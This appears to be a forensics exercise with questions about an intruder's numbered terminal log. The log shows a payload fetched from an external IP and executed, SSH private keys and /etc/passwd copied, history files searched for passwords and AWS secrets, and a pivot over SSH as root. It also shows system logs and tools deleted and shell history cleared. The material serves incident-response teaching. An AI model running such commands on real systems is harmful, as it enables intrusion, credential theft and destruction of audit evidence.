**Instructions:** listed below is the logged terminal session from an intruder on the system. Answer the questions based on the terminal log.
1. What is the command the intruder ran to check for hidden files?
2. What external IP address does the intruder download files from?
3. On line 19, what is the intruder's full working directory path (i.e., where does `id_rsa` get renamed)?
4. What is the intruder trying to accomplish with commands 17–19 (`cp`, `cp`, `mv`)?
5. List every file/directory the intruder deletes in the second half of the session (lines 34–40) and explain what evidence each deletion is meant to destroy.


```
  1  ls
  2  ls -a
  3  cd /tmp
  4  mkdir .cache
  5  cd .cache
  6  wget http://45.33.22.156/payload.sh
  7  ls
  8  chmod +x payload.sh
  9  ./payload.sh
 10  cd ~
 11  ls -a
 12  mkdir .config/systemd-helper
 13  cd .config/systemd-helper
 14  wget http://45.33.22.156/collector.py
 15  wget http://45.33.22.156/keys.txt
 16  ls
 17  cp /etc/passwd ./passwd.bak
 18  cp /home/*/.ssh/id_rsa ./
 19  mv id_rsa authorized_key_backup
 20  ls -a
 21  grep -r "password" /home/ 2>/dev/null
 22  grep -i "aws_secret" /home/*/.bash_history
 23  touch .last_seen
 24  cd /var/log
 25  rm auth.log
 26  rm wtmp
 27  touch auth.log
 28  cd ~/.config/systemd-helper
 29  ssh -i authorized_key_backup root@172.16.4.201
 30  cd /root
 31  ls -a
 32  cp .bash_history /home/user/.config/systemd-helper/root_history.bak
 33  exit
 34  cd ~/.config/systemd-helper
 35  ls
 36  rm collector.py
 37  rm keys.txt
 38  cd ~
 39  rm -rf .config/systemd-helper
 40  history -c
```
